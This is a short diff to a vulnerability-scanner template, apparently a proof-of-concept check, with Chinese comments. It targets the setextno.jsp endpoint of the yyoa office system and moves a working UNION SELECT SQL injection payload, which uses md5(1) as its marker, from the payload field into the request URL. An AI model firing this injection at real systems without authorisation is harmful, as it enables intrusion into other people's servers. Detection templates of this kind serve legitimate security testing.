@@ -8,11 +8,11 @@
 
 #漏洞的位置
 - url:
-  - url : "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp"
+  - url : "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
 
 #payload
 - payload:
-  - payload: "user_ids=(99999)+union+all+select+1,2,(md5(1)),4#"
+  - payload: "isNone"
 
 #response包里状态码
 - status:
